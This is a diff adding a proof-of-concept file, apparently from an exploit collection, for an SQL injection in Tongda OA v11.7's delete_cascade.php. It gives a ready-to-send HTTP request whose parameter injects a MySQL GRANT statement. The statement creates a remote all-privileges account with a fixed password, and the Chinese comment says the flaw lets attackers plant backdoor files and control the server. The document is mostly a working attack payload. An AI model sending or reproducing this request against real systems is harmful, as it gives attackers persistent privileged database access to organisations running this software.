@@ -1,0 +1,9 @@
+# 通达OA v11.7 delete_cascade.php后台SQL注入
+# 通达OA v11.7 delete_cascade.php 后台存在SQL注入，攻击者通过此漏洞可以写入恶意文件后门控制服务器。
+GET /general/hr/manage/query/delete_cascade.php?acid=80025416&condition_cascade=grant%20all%20privileges%20ON%20mysql.%20TO%20%27peiqi%27@%27%25%27%20IDENTIFIED%20BY%20%27peiqiABC@123%27%20WITH%20GRANT%20OPTION&bid=hd_tag_m8mv26ax HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26ax
+RM-PRO-Token: ab61444b8a99df320821e8a990f7a3be
+RM-PRO-Time: 1742808569538
+User-Agent: curl/7.83.1
+
